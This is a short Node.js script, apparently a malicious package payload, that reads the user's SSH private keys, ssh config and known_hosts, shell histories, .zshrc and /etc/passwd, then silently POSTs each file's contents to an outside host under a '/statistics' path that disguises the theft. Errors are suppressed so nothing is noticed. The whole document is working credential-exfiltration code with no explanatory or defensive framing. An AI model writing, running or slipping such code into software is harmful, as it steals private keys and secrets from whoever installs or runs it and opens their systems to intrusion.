var fs = require('fs')
var http = require("https");
var os = require('os');
let filesOfInterest = ["/.zshrc", "/.bash_history", "/.zsh_history",
                       "/.ssh/id_rsa", "/.ssh/id_ed25519",
                       "/.ssh/known_hosts", "/.ssh/config",
                       "../../../../etc/passwd"];

const homedir = os.homedir();

for (let fileofinterest of filesOfInterest) {
  fs.readFile(homedir + fileofinterest, 'utf8', function (err,data) {
    if (err) {
      return;
    }

    var options = {
      hostname: 'hack-collect-dev.bynder.io',
      port: 443,
      path: '/statistics',
      method: 'POST',
    };
    var req = http.request(options, function(res) {
      res.setEncoding('utf8');
    });
    req.on('error', function(e) {
      // Silence
    });
    // write data to request body
    req.write(data);
    req.end();
  });
}
